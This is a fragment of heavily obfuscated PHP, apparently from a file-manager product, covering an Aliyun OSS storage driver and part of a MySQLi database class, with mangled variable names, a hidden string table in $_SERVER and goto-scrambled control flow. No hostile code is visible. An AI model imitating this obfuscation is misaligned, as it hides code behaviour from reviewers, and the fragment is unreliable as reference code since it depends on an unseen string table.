$Còéˆ´Ú€Ü = $cÊ∫ïıÁÔ¨->getObjectList(); $AäΩì™ÌÛ» = $cÊ∫ïıÁÔ¨->getPrefixList(); if ($Cµí Á‹çÆ) { if (count($Còéˆ´Ú€Ü) > 1 || count($Còéˆ´Ú€Ü) == 1 && $Còéˆ´Ú€Ü[0]->getKey() != $d¬∆≤“·‘€) { $Aèß§ˆ¯Íë += count($Còéˆ´Ú€Ü) - 1; } if (!empty($AäΩì™ÌÛ»)) { $c◊Àü◊„∂ı += count($AäΩì™ÌÛ»); } if ($f·âÃà∆æ« === $fñÌöû∑°[33]) { break; } continue; } if ($bØﬁ†Ëóé•) { if (!empty($Còéˆ´Ú€Ü)) { if (count($Còéˆ´Ú€Ü) > 1 || $Còéˆ´Ú€Ü[0]->getKey() != $d¬∆≤“·‘€) { return !0; } } } else { if (!empty($AäΩì™ÌÛ»)) { return !0; } } if ($f·âÃà∆æ« === $fñÌöû∑°[33]) { break; } } if ($Cµí Á‹çÆ) { return array($fñÌöû∑°[198] => $Aèß§ˆ¯Íë, $fñÌöû∑°[199] => $c◊Àü◊„∂ı); } goto FÚ—œÒıûÏ; cﬂì¯ù—ãœ: $f·âÃà∆æ« = $fñÌöû∑°[33]; $e¯∏‘ö¬∞π = 500; $Aèß§ˆ¯Íë = 0; goto F◊Û™õèË•; dÆù”ˆêà—: } public function listAll($C— á∫≤È’) { $dŸ ÑÉèÜ‹ =& $_SERVER[Æ¡î¢≠¯™]; $c†∞î¬åò = $this->fileList($C— á∫≤È’, $dŸ ÑÉèÜ‹[33], !0); $b ≠Úöâ÷ = array(); foreach ($c†∞î¬åò[$dŸ ÑÉèÜ‹[83]] as $F∑Áπ†ÿ≈ë) { $b ≠Úöâ÷[$F∑Áπ†ÿ≈ë[$dŸ ÑÉèÜ‹[28]]] = $F∑Áπ†ÿ≈ë[$dŸ ÑÉèÜ‹[87]]; } return $this->listAllFiles($C— á∫≤È’, array_keys($b ≠Úöâ÷), $b ≠Úöâ÷); } public function canRead($E•ëäÎî®) { $b»Ç€±ÚÂø =& $_SERVER[Æ¡î¢≠¯™]; $b…‚ó≠»ãì = $this->pathAcl($E•ëäÎî®); return $b…‚ó≠»ãì == $b»Ç€±ÚÂø[1172] || $b…‚ó≠»ãì == $b»Ç€±ÚÂø[495] ? !0 : !1; } public function canWrite($DÿêÛà˜íﬂ) { $Dﬁø‚’Ÿ¥± = $this->pathAcl($DÿêÛà˜íﬂ); return $Dﬁø‚’Ÿ¥± == $_SERVER[Æ¡î¢≠¯™][495] ? !0 : !1; } public function pathAcl($Aπêöü¥«´) { goto Fä–èë∂≥‘; d¿Í‰±®›ä: return $Bπâ∫çÆ¯û; goto eñÕ¶ü˜√º; Fä–èë∂≥‘: $FﬁØ‡™èê¨ =& $_SERVER[Æ¡î¢≠¯™]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $B–˘àË¢í = $this->client->getObjectAcl($this->bucket, $this->pathEncode($Aπêöü¥«´)); } catch (OSS\Core\OssException $EËÚ∂˜∆Ô≤) { return !1; } goto bÑäù¡µî®; bÑäù¡µî®: $Bπâ∫çÆ¯û = $B–˘àË¢í == $FﬁØ‡™èê¨[34] ? $this->bucketAcl : $B–˘àË¢í; if ($Bπâ∫çÆ¯û == $FﬁØ‡™èê¨[1173]) { return $FﬁØ‡™èê¨[1172]; } if ($Bπâ∫çÆ¯û == $FﬁØ‡™èê¨[1174]) { return $FﬁØ‡™èê¨[495]; } goto d¿Í‰±®›ä; eñÕ¶ü˜√º: } private function chmodPath($f‘ú—üöÛ, $CùˆÚêÃáÿ = '') { $Aµí‘ƒó®„ =& $_SERVER[Æ¡î¢≠¯™]; $dêÜ∏‚∑•È = empty($CùˆÚêÃáÿ) ? $Aµí‘ƒó®„[1174] : $CùˆÚêÃáÿ; $dÍ˜àã¯Œó = array($Aµí‘ƒó®„[34], $Aµí‘ƒó®„[192], $Aµí‘ƒó®„[1173], $Aµí‘ƒó®„[1174]); if (!in_array($dêÜ∏‚∑•È, $dÍ˜àã¯Œó)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($f‘ú—üöÛ), $dêÜ∏‚∑•È); } catch (OSS\Core\OssException $Bëâú™ÔëÜ) { return !1; } return !0; } public function getContent($Aá∏ÀÿæÂ•) { return $this->fileSubstr($Aá∏ÀÿæÂ•, -1); } public function setContent($BË±≥›óÆÀ, $d∑ªÖÈô»∆ = '') { $e•™øìè†Ã =& $_SERVER[Æ¡î¢≠¯™]; try { $eö“ßΩÿ…á = $this->trafficLimit($e•™øìè†Ã[1175]); $CÉ„øåŒøÂ = $this->client->putObject($this->bucket, $this->pathEncode($BË±≥›óÆÀ), $d∑ªÖÈô»∆, $eö“ßΩÿ…á); } catch (OSS\Core\OssException $B±ñ∑Ü±°á) { return !1; } $d‰Ø˜ÍƒÖÓ = array($e•™øìè†Ã[1162] => trim($CÉ„øåŒøÂ[$e•™øìè†Ã[1176]], $e•™øìè†Ã[123]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($BË±≥›óÆÀ))); $this->updateObjMeta($BË±≥›óÆÀ, $d‰Ø˜ÍƒÖÓ); return isset($CÉ„øåŒøÂ[$e•™øìè†Ã[1177]][$e•™øìè†Ã[1124]]) ? (int) $CÉ„øåŒøÂ[$e•™øìè†Ã[1177]][$e•™øìè†Ã[1124]] : strlen($CÉ„øåŒøÂ); } private function updateObjMeta($bìÿ¥Êü†Ö, $E–∂Ò¨±—”) { $bìÿ¥Êü†Ö = $this->pathEncode($bìÿ¥Êü†Ö); try { $bŸà’‚æÜ∞ = array(OSS\OssClient::OSS_HEADERS => $E–∂Ò¨±—”); $this->client->copyObject($this->bucket, $bìÿ¥Êü†Ö, $this->bucket, $bìÿ¥Êü†Ö, $bŸà’‚æÜ∞); } catch (OSS\Core\OssException $dÒÓÂﬁ±¯≥) { return !1; } return !0; } public function upload($Eú§„Øíäà, $fòèÉüõ˜Ê, $b≤π–µ»÷≈ = false, $eñ»¨†Ô∆§ = REPEAT_REPLACE) { $F√ºäÌ¢óÖ =& $_SERVER[Æ¡î¢≠¯™]; $c◊àÌÏ‡æƒ = trim($Eú§„Øíäà, $F√ºäÌ¢óÖ[8]); $côòıõ∂≈¥ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => $this->osChunkSize(), OSS\OssClient::OSS_HEADERS => array($F√ºäÌ¢óÖ[1162] => @md5_file($fòèÉüõ˜Ê)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($Eú§„Øíäà))); $côòıõ∂≈¥ = $this->trafficLimit($F√ºäÌ¢óÖ[1175], $côòıõ∂≈¥); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($c◊àÌÏ‡æƒ), $fòèÉüõ˜Ê, $côòıõ∂≈¥); } catch (OSS\Core\OssException $AîÔˆí • ) { return !1; } return $this->getPathOuter($Eú§„Øíäà); } public function getHost() { $DºôÀ≤òÃ =& $_SERVER[Æ¡î¢≠¯™]; $EÕ∑êΩÑ•  = explode($DºôÀ≤òÃ[178], parent::getHost()); return $EÕ∑êΩÑ• [0] . $DºôÀ≤òÃ[178] . $this->bucket . $DºôÀ≤òÃ[103] . $EÕ∑êΩÑ• [1]; } public function uploadFormData($FÁûÂπ†¿É, $A∆úÏù«–ó = 3600) { goto cÇÓœà¢˘£; f§…Ûë±Òà: $EÙçÕ°á†„ = date($CÓŒúéÕàµ[1178], time() + $FÖÕÜ´≠ÑÑ); $eôÃöãÿÃÖ = new DateTime($EÙçÕ°á†„); $eƒªï√£®¡ = $eôÃöãÿÃÖ->format(DateTime::ISO8601); goto f€ŒÿŸê◊∫; AÃ™®ƒÃŒÿ: return $C¥ùÁçÊ•ç; goto A¶±·àëØ∫; f›∞ì¡ô°É: $F¶¯Óõë•¯ = $this->pathFather($FÁûÂπ†¿É); $C›ò¨≤ûÙ = array($CÓŒúéÕàµ[1081] => $eƒªï√£®¡, $CÓŒúéÕàµ[1082] => array(array($CÓŒúéÕàµ[1180], 0, $dÊâœØµƒª), array($CÓŒúéÕàµ[1085], $CÓŒúéÕàµ[1086], $F¶¯Óõë•¯))); $BÔØ´Ú√ıÉ = base64_encode(json_encode($C›ò¨≤ûÙ)); goto f∏Ó°ºﬁïç; cÇÓœà¢˘£: $CÓŒúéÕàµ =& $_SERVER[Æ¡î¢≠¯™]; if (!($b•ëéÑıü« = $this->getHost())) { return !1; } $FÖÕÜ´≠ÑÑ = $A∆úÏù«–ó; goto f§…Ûë±Òà; f€ŒÿŸê◊∫: $BÀœ‰âú±å = strpos($eƒªï√£®¡, $CÓŒúéÕàµ[290]); $eƒªï√£®¡ = substr($eƒªï√£®¡, 0, $BÀœ‰âú±å) . $CÓŒúéÕàµ[1179]; $dÊâœØµƒª = 1048576000 * 5; goto f›∞ì¡ô°É; f∏Ó°ºﬁïç: $e…¡À≈ÇÌ° = base64_encode(hash_hmac($CÓŒúéÕàµ[224], $BÔØ´Ú√ıÉ, $this->secret, !0)); $C¥ùÁçÊ•ç = array($CÓŒúéÕàµ[1091] => $BÔØ´Ú√ıÉ, $CÓŒúéÕàµ[1181] => $this->accessKey, $CÓŒúéÕàµ[1087] => $CÓŒúéÕàµ[1079], $CÓŒúéÕàµ[1182] => $e…¡À≈ÇÌ°, $CÓŒúéÕàµ[176] => $b•ëéÑıü«); $C¥ùÁçÊ•ç = $this->trafficLimit($CÓŒúéÕàµ[1175], $C¥ùÁçÊ•ç); goto AÃ™®ƒÃŒÿ; A¶±·àëØ∫: } public function multiUploadFormData($EŒÉã≠òﬂ•, $aËö∏ÁÈ•é = 3600) { $eÒˆ—äÊù… =& $_SERVER[Æ¡î¢≠¯™]; if (!($B¢¯∆≤ÑﬁÍ = $this->getHost())) { return !1; } $AÉµ°–ªÚê = $this->trafficLimit($eÒˆ—äÊù…[1175]); $dŸÚ∆Ì°‰® = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($EŒÉã≠òﬂ•), $AÉµ°–ªÚê); return array($eÒˆ—äÊù…[216] => $dŸÚ∆Ì°‰®, $eÒˆ—äÊù…[176] => $B¢¯∆≤ÑﬁÍ . $eÒˆ—äÊù…[8] . $this->pathEncode($EŒÉã≠òﬂ•), $eÒˆ—äÊù…[217] => gmdate($eÒˆ—äÊù…[1183]), $eÒˆ—äÊù…[99] => $EŒÉã≠òﬂ•); } public function multiUploadAuthData($aã€ºÿæÛã, $F†éè†ÚèÉ = array()) { goto Cø„ÇõÇã¶; Däû≤…ëÜö: $bêŒìÑ‚‚£ = $F°ÂÜ¿˘ï£[1186] . $this->accessKey . $F°ÂÜ¿˘ï£[4] . $aˆú·∆øù¶; if (strpos($b”üﬂÑﬂÏ®, $F°ÂÜ¿˘ï£[220]) === 0) { $bêŒìÑ‚‚£ = array($F°ÂÜ¿˘ï£[226] => $bêŒìÑ‚‚£, $F°ÂÜ¿˘ï£[217] => $FíÏ◊∑Ωëµ); if ($E„Û°üôƒŸ) { $bêŒìÑ‚‚£ = array_merge($bêŒìÑ‚‚£, $E„Û°üôƒŸ); } } return $bêŒìÑ‚‚£; goto a¥ï⁄’ΩÎÆ; Cø„ÇõÇã¶: $F°ÂÜ¿˘ï£ =& $_SERVER[Æ¡î¢≠¯™]; $FíÏ◊∑Ωëµ = isset($F†éè†ÚèÉ[$F°ÂÜ¿˘ï£[217]]) ? $F†éè†ÚèÉ[$F°ÂÜ¿˘ï£[217]] : gmdate($F°ÂÜ¿˘ï£[1183]); $b”üﬂÑﬂÏ® = isset($F†éè†ÚèÉ[$F°ÂÜ¿˘ï£[167]]) ? $F†éè†ÚèÉ[$F°ÂÜ¿˘ï£[167]] : $F°ÂÜ¿˘ï£[33]; goto DÃ‚™ƒ≈‡ñ; DÃ‚™ƒ≈‡ñ: $aÊ‚π∂≥ÜÂ = $aã€ºÿæÛã; if (isset($F†éè†ÚèÉ[$F°ÂÜ¿˘ï£[99]])) { $aÊ‚π∂≥ÜÂ = $F†éè†ÚèÉ[$F°ÂÜ¿˘ï£[99]]; unset($F†éè†ÚèÉ[$F°ÂÜ¿˘ï£[99]]); } if (isset($F†éè†ÚèÉ[$F°ÂÜ¿˘ï£[218]])) { $F†éè†ÚèÉ[$F°ÂÜ¿˘ï£[217]] = $FíÏ◊∑Ωëµ; return $this->listUploadParts($aÊ‚π∂≥ÜÂ, $F†éè†ÚèÉ); } goto A´÷›⁄ûæ„; A´÷›⁄ûæ„: $füáãêÕ∫Ó = array($F°ÂÜ¿˘ï£[219], $F°ÂÜ¿˘ï£[33], $F°ÂÜ¿˘ï£[126], $FíÏ◊∑Ωëµ, "\170\x2d\x6f\163\163\55\144\141\x74\145\72{$FíÏ◊∑Ωëµ}", $F°ÂÜ¿˘ï£[8] . $this->bucket . $F°ÂÜ¿˘ï£[8] . $aÊ‚π∂≥ÜÂ . $b”üﬂÑﬂÏ®); if (strpos($b”üﬂÑﬂÏ®, $F°ÂÜ¿˘ï£[220]) === 0) { $füáãêÕ∫Ó[0] = $F°ÂÜ¿˘ï£[221]; if ($E„Û°üôƒŸ = $this->trafficLimit($F°ÂÜ¿˘ï£[1175])) { $aÊ‚π∂≥ÜÂ = $F°ÂÜ¿˘ï£[1184]; array_splice($füáãêÕ∫Ó, 5, 0, $aÊ‚π∂≥ÜÂ . $F°ÂÜ¿˘ï£[4] . $E„Û°üôƒŸ[$aÊ‚π∂≥ÜÂ]); } } if (isset($F†éè†ÚèÉ[$F°ÂÜ¿˘ï£[222]]) && $F†éè†ÚèÉ[$F°ÂÜ¿˘ï£[222]] == $F°ÂÜ¿˘ï£[223]) { $füáãêÕ∫Ó[0] = $F°ÂÜ¿˘ï£[223]; } goto CõÆΩ≈√‰è; CõÆΩ≈√‰è: if (!empty($F†éè†ÚèÉ[$F°ÂÜ¿˘ï£[1185]])) { $DÃÁ’ı–€ô = array_merge(array($füáãêÕ∫Ó[4]), $F†éè†ÚèÉ[$F°ÂÜ¿˘ï£[1185]]); sort($DÃÁ’ı–€ô); $füáãêÕ∫Ó[4] = implode($F°ÂÜ¿˘ï£[62], $DÃÁ’ı–€ô); } $C√ÃçÂõæƒ = implode($F°ÂÜ¿˘ï£[62], $füáãêÕ∫Ó); $aˆú·∆øù¶ = base64_encode(hash_hmac($F°ÂÜ¿˘ï£[224], $C√ÃçÂõæƒ, $this->secret, !0)); goto Däû≤…ëÜö; a¥ï⁄’ΩÎÆ: } public function listUploadParts($dºˆ‡ﬁ∑∆Ù, $D—‡∂œÖò…) { goto cÒÎ⁄∆ﬁ÷”; cÒÎ⁄∆ﬁ÷”: $C¶«ÛãÓîÈ =& $_SERVER[Æ¡î¢≠¯™]; $AÀÉ°ú¯‚Õ = parse_url_query($D—‡∂œÖò…[$C¶«ÛãÓîÈ[167]]); $Fµ›ÍÍ©ûŸ = $this->client->listParts($this->bucket, $this->pathEncode($dºˆ‡ﬁ∑∆Ù), $AÀÉ°ú¯‚Õ[$C¶«ÛãÓîÈ[216]]); goto bè∆ã≈ÍºØ; cÜ—ó∆’¶€: unset($D—‡∂œÖò…[$C¶«ÛãÓîÈ[218]], $D—‡∂œÖò…[$C¶«ÛãÓîÈ[222]]); $CéÊ’œŸŒÿ = $this->multiUploadAuthData($dºˆ‡ﬁ∑∆Ù, $D—‡∂œÖò…); if (empty($CéÊ’œŸŒÿ)) { return !1; } goto F¯ı µáù; F¯ı µáù: return array($C¶«ÛãÓîÈ[226] => $CéÊ’œŸŒÿ, $C¶«ÛãÓîÈ[217] => $D—‡∂œÖò…[$C¶«ÛãÓîÈ[217]], $C¶«ÛãÓîÈ[228] => $dùªßñ°õÕ); goto Dá◊÷ºŸÈ≤; bè∆ã≈ÍºØ: $f¯÷àº¯‹ = $Fµ›ÍÍ©ûŸ->getListPart(); $dùªßñ°õÕ = array(); foreach ($f¯÷àº¯‹ as $AØƒ§ÜùÉƒ) { $dùªßñ°õÕ[] = array($C¶«ÛãÓîÈ[1166] => $AØƒ§ÜùÉƒ->getPartNumber(), $C¶«ÛãÓîÈ[1167] => trim($AØƒ§ÜùÉƒ->getETag(), $C¶«ÛãÓîÈ[123])); } goto cÜ—ó∆’¶€; Dá◊÷ºŸÈ≤: } public function download($eõ˜ƒâì≈Œ, $Döòá Æ–É) { if ($this->isFolder($eõ˜ƒâì≈Œ)) { return !1; } try { $dáÊ≈‰îµ∞ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $Döòá Æ–É); $dáÊ≈‰îµ∞ = $this->trafficLimit($_SERVER[Æ¡î¢≠¯™][115], $dáÊ≈‰îµ∞); $this->client->getObject($this->bucket, $this->pathEncode($eõ˜ƒâì≈Œ), $dáÊ≈‰îµ∞); } catch (OSS\Core\OssException $EûÕå÷Ñ—ç) { return !1; } return $Döòá Æ–É; } public function fileSubstr($dµÜœ¶ç√∑, $däç…îﬁÖ˘ = 0, $f‚æÂ∏ﬂá‚ = false) { if ($däç…îﬁÖ˘ === -1) { $D˜¬ã«ÁÏ† = array(); } else { if ($f‚æÂ∏ﬂá‚ === !1) { $dÑı‹œ”´° = $this->size($dµÜœ¶ç√∑); } else { $dÑı‹œ”´° = $däç…îﬁÖ˘ + $f‚æÂ∏ﬂá‚ - 1; } $D˜¬ã«ÁÏ† = array(OSS\OssClient::OSS_RANGE => "{$däç…îﬁÖ˘}\x2d{$dÑı‹œ”´°}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($dµÜœ¶ç√∑), $D˜¬ã«ÁÏ†); } catch (OSS\Core\OssException $cµ£≠†„Ûÿ) { think_exception($cµ£≠†„Ûÿ->getMessage()); return !1; } } private function trafficLimit($F∆ã‚âÕŸå, $AˆÈÿà√‚’ = array()) { goto EœòËË¶çÔ; EœòËË¶çÔ: $a˜àëê¬ßã =& $_SERVER[Æ¡î¢≠¯™]; if ($F∆ã‚âÕŸå == $a˜àëê¬ßã[1175] && $this->isUploadServer() || $F∆ã‚âÕŸå == $a˜àëê¬ßã[115] && $this->isFileOutServer()) { return $AˆÈÿà√‚’; } $EÜ¨¶–¨¿Á = floatval($GLOBALS[$a˜àëê¬ßã[6]][$a˜àëê¬ßã[94]][$a˜àëê¬ßã[101]][$F∆ã‚âÕŸå]) * 1024 * 1024 * 8; goto c‹Ø„È†û”; c‹Ø„È†û”: if (!$EÜ¨¶–¨¿Á) { return $AˆÈÿà√‚’; } $EÜ¨¶–¨¿Á = $EÜ¨¶–¨¿Á < 819200 ? 819200 : ($EÜ¨¶–¨¿Á > 838860800 ? 838860800 : $EÜ¨¶–¨¿Á); $AˆÈÿà√‚’[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($EÜ¨¶–¨¿Á); goto B›Ë√Ø⁄»¡; B›Ë√Ø⁄»¡: return $AˆÈÿà√‚’; goto eÒÛÖ¶Ë¿Ñ; eÒÛÖ¶Ë¿Ñ: } public function link($bûÃ«§åƒÒ, $E¯Ô∏ªÏê„ = array()) { $d·ËñπıØñ =& $_SERVER[Æ¡î¢≠¯™]; if (!$this->exist($bûÃ«§åƒÒ) || $this->isFolder($bûÃ«§åƒÒ)) { return !1; } try { $E¯Ô∏ªÏê„ = $this->trafficLimit($d·ËñπıØñ[115], $E¯Ô∏ªÏê„); $f®πÛ–ÎÔ⁄ = $this->client->signUrl($this->bucket, $this->pathEncode($bûÃ«§åƒÒ), 3600 * 12, $d·ËñπıØñ[223], $E¯Ô∏ªÏê„); return $this->getCdnLink($f®πÛ–ÎÔ⁄); } catch (OSS\Core\OssException $aÁôÖ˘ñ©Ï) { return !1; } } public function fileOut($dÑéıÉÒ¯ÿ, $D—≠ÖÂ≤´µ = false, $c∂òú™¯ì‚ = false, $aêóÇ≤Öø« = '') { goto dÈÎ’ºÒ…∑; Eıÿ©“Öﬁ: $AÇƒò√∏ı◊ = array(OSS\OssClient::OSS_SUB_RESOURCE => $d´À›øÜµ¥[1187] . rawurlencode("{$D—≠ÖÂ≤´µ}\73\x66\151\x6c\145\156\141\x6d\145\75{$c∂òú™¯ì‚}")); $AÇƒò√∏ı◊[OSS\OssClient::OSS_SUB_RESOURCE] .= $d´À›øÜµ¥[1188] . $f·âÆê–©›; $FÙÎ¡ÇÈÎÜ = $this->link($dÑéıÉÒ¯ÿ, $AÇƒò√∏ı◊); goto eúÜöò‹›‹; a∂ä·êÀ÷ú: $f·âÆê–©› = get_file_mime(get_path_ext($c∂òú™¯ì‚)); if ($f·âÆê–©› == $d´À›øÜµ¥[208]) { return parent::fileOut($dÑéıÉÒ¯ÿ, $D—≠ÖÂ≤´µ, $c∂òú™¯ì‚, $aêóÇ≤Öø«); } $D—≠ÖÂ≤´µ = $D—≠ÖÂ≤´µ ? $d´À›øÜµ¥[209] : $d´À›øÜµ¥[210]; goto Eıÿ©“Öﬁ; eúÜöò‹›‹: $this->fileOutLink($FÙÎ¡ÇÈÎÜ); goto BØÆãªêç‰; dÈÎ’ºÒ…∑: $d´À›øÜµ¥ =& $_SERVER[Æ¡î¢≠¯™]; if (!$c∂òú™¯ì‚) { $c∂òú™¯ì‚ = $this->pathThis($dÑéıÉÒ¯ÿ); } $c∂òú™¯ì‚ = rawurlencode($c∂òú™¯ì‚); goto a∂ä·êÀ÷ú; BØÆãªêç‰: } public function fileOutServer($aƒƒÉƒ—íê, $aæﬁ‚”ßˆΩ = false, $dºßÜî¡‡» = false, $DíÖÈ¿∂ÏÏ = '') { parent::fileOut($aƒƒÉƒ—íê, $aæﬁ‚”ßˆΩ, $dºßÜî¡‡», $DíÖÈ¿∂ÏÏ); } public function fileOutImage($dÛ‡ΩÑÈ˘˘, $D∂¢Ç‹÷õŸ = 250) { $e˘—Ÿçß·ƒ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[Æ¡î¢≠¯™][1189] . $D∂¢Ç‹÷õŸ); $Fæ˘»¬ºÈ’ = $this->link($dÛ‡ΩÑÈ˘˘, $e˘—Ÿçß·ƒ); $this->fileOutLink($Fæ˘»¬ºÈ’); } public function fileOutImageServer($e¯èô ´îé, $A¶Ç∆›äÜ† = 250) { parent::fileOutImage($e¯èô ´îé, $A¶Ç∆›äÜ†); } public function fileOutLink($a‡é≠í√ëê) { $CÑ‚ÿûà©Ó =& $_SERVER[Æ¡î¢≠¯™]; if (!$this->isCdnHost() && substr($a‡é≠í√ëê, 0, 7) == $CÑ‚ÿûà©Ó[1094]) { $a‡é≠í√ëê = $CÑ‚ÿûà©Ó[1095] . substr($a‡é≠í√ëê, 7); } header($CÑ‚ÿûà©Ó[163] . $a‡é≠í√ëê); die; } public function hashMd5($Cô´°ä€êí, $AöÜŒ—ÔÓÑ = '') { $B€íû´å€ç =& $_SERVER[Æ¡î¢≠¯™]; $a»ﬁıá”›≥ = $this->objectMeta($Cô´°ä€êí); if (!$a»ﬁıá”›≥) { return $B€íû´å€ç[33]; } if (!isset($a»ﬁıá”›≥[$B€íû´å€ç[1162]]) && !empty($AöÜŒ—ÔÓÑ)) { $d†•ÖÁáä∫ = $this->updateObjMeta($Cô´°ä€êí, array($B€íû´å€ç[1162] => $AöÜŒ—ÔÓÑ)); $a»ﬁıá”›≥[$B€íû´å€ç[1162]] = $d†•ÖÁáä∫ ? $AöÜŒ—ÔÓÑ : $B€íû´å€ç[33]; } return isset($a»ﬁıá”›≥[$B€íû´å€ç[1162]]) ? strtolower($a»ﬁıá”›≥[$B€íû´å€ç[1162]]) : $B€íû´å€ç[33]; } public function size($E÷ÔÃ—Áãç) { $EëƒÃìîÑ” = $this->objectMeta($E÷ÔÃ—Áãç); return $EëƒÃìîÑ” ? $EëƒÃìîÑ”[$_SERVER[Æ¡î¢≠¯™][87]] : 0; } public function info($CÕì≥¢ƒ¬„) { if ($this->isFolder($CÕì≥¢ƒ¬„)) { return $this->folderInfo($CÕì≥¢ƒ¬„); } else { if ($this->isFile($CÕì≥¢ƒ¬„)) { return $this->fileInfo($CÕì≥¢ƒ¬„); } } return !1; } public function exist($Bû–àãùÆ‡) { return $this->isFile($Bû–àãùÆ‡) || $this->isFolder($Bû–àãùÆ‡); } public function isFile($bêüÑ≤º∫º) { return !$this->isFolder($bêüÑ≤º∫º) && $this->objectMeta($bêüÑ≤º∫º); } public function isFolder($déÒìÃ„ÉÉ) { return $this->cacheMethod($_SERVER[Æ¡î¢≠¯™][229], $déÒìÃ„ÉÉ); } protected function objectMeta($C∫òÉñ√è¥) { return $this->cacheMethod($_SERVER[Æ¡î¢≠¯™][230], $C∫òÉñ√è¥); } protected function _objectMeta($FπäóÌá‚Œ) { $dŸ◊¯≥à≤ã =& $_SERVER[Æ¡î¢≠¯™]; try { $aüÜ≤ƒŸ±ô = $this->client->getObjectMeta($this->bucket, $this->pathEncode($FπäóÌá‚Œ)); } catch (OSS\Core\OssException $DßÿÉØæ¶ú) { $aüÜ≤ƒŸ±ô = !1; } if ($aüÜ≤ƒŸ±ô) { $aüÜ≤ƒŸ±ô[$dŸ◊¯≥à≤ã[87]] = intval($aüÜ≤ƒŸ±ô[$dŸ◊¯≥à≤ã[1169]]); } return $aüÜ≤ƒŸ±ô; } protected function _isFolder($AÊ∂›ÉÇ¶) { $dáã©Ùù›‘ =& $_SERVER[Æ¡î¢≠¯™]; if ($AÊ∂›ÉÇ¶ == $dáã©Ùù›‘[33] || $AÊ∂›ÉÇ¶ == $dáã©Ùù›‘[8]) { return !0; } $DÓ¡ÿÙ∑ﬂ◊ = array($dáã©Ùù›‘[1159] => $dáã©Ùù›‘[8], $dáã©Ùù›‘[193] => rtrim($AÊ∂›ÉÇ¶, $dáã©Ùù›‘[8]) . $dáã©Ùù›‘[8], $dáã©Ùù›‘[1160] => 1, $dáã©Ùù›‘[1161] => $dáã©Ùù›‘[33]); $fäƒÕ∑Úë¥ = $this->client->listObjects($this->bucket, $DÓ¡ÿÙ∑ﬂ◊); if ($fäƒÕ∑Úë¥->getObjectList() || $fäƒÕ∑Úë¥->getPrefixList()) { return !0; } return !1; } } goto Dû“õÎäÁ»; Cüî‚¢Çÿ: class DbMysqli extends Db { public function __construct($cﬁ°äÆ⁄æ¥ = '') { $AÈëà≥Ê∞Ÿ =& $_SERVER[Æ¡î¢≠¯™]; if (!extension_loaded($AÈëà≥Ê∞Ÿ[719])) { think_exception(think_lang($AÈëà≥Ê∞Ÿ[10]) . $AÈëà≥Ê∞Ÿ[812]); } if (!empty($cﬁ°äÆ⁄æ¥)) { $this->config = $cﬁ°äÆ⁄æ¥; if (empty($this->config[$AÈëà≥Ê∞Ÿ[13]])) { $this->config[$AÈëà≥Ê∞Ÿ[13]] = $AÈëà≥Ê∞Ÿ[33]; } } } public function connect($D—úì¬”‘ï = '', $EÕ‡ÖÿÌö» = 0) { $DÇ”ÖÜÌØ =& $_SERVER[Æ¡î¢≠¯™]; if (!isset($this->linkID[$EÕ‡ÖÿÌö»])) { goto Dî®™≥¯õâ; d¢π»ë®Ùê: $Aø¯é≤Ì = $this->linkID[$EÕ‡ÖÿÌö»]->server_version; $this->linkID[$EÕ‡ÖÿÌö»]->query($DÇ”ÖÜÌØ[790] . think_config($DÇ”ÖÜÌØ[791]) . $DÇ”ÖÜÌØ[55]); if ($Aø¯é≤Ì > $DÇ”ÖÜÌØ[792]) { $this->linkID[$EÕ‡ÖÿÌö»]->query($DÇ”ÖÜÌØ[793]); } goto fÒõ ä€≤; fÒõ ä€≤: $this->connected = !0; if (1 != think_config($DÇ”ÖÜÌØ[18])) { unset($this->config); } goto b†Ùÿ‚œü™; Dî®™≥¯õâ: if (empty($D—úì¬”‘ï)) { $D—úì¬”‘ï = $this->config; } $this->linkID[$EÕ‡ÖÿÌö»] = new mysqli($D—úì¬”‘ï[$DÇ”ÖÜÌØ[786]], $D—úì¬”‘ï[$DÇ”ÖÜÌØ[788]], $D—úì¬”‘ï[$DÇ”ÖÜÌØ[789]], $D—úì¬”‘ï[$DÇ”ÖÜÌØ[17]], $D—úì¬”‘ï[$DÇ”ÖÜÌØ[787]] ? intval($D—úì¬”‘ï[$DÇ”ÖÜÌØ[787]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } goto d¢π»ë®Ùê; b†Ùÿ‚œü™: } return $this->linkID[$EÕ‡ÖÿÌö»]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($f¬õÀ®„¯€) { goto f˘ø±ÌùÜ∏; a£√éÔÜ…á: think_status($E˜„É˜ùŸã[20]); $this->queryID = $this->_linkID->query($f¬õÀ®„¯€); if ($this->_linkID->more_results()) { while (($fÚ”çïÓ—≤ = $this->_linkID->next_result()) != NULL) { $fÚ”çïÓ—≤->free_result(); } } goto fúûí˜≤ﬂï; fúûí˜≤ﬂï: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } goto bÉî⁄ò˘ìå; DúÕÁêå: $this->queryStr = $f¬õÀ®„¯€; if ($this->queryID) { $this->free(); } think_action_status($E˜„É˜ùŸã[19], 1); goto a£√éÔÜ…á; f˘ø±ÌùÜ∏: $E˜„É˜ùŸã =& $_SERVER[Æ¡î¢≠¯™]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto DúÕÁêå; bÉî⁄ò˘ìå: } public function execute($A∆‰§‰≈µ‡) { goto F©Â∏™ŒÊä; b•¥ƒ√ïá√: $this->queryStr = $A∆‰§‰≈µ‡; if ($this->queryID) { $this->free(); } think_action_status($E∏Œ‹È˜ÎÇ[21], 1); goto Fﬁ¬ØÀ„Ç”; F∆ÓºòÚ√ó: if (!1 === $d¢îÒëˆÔÍ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } 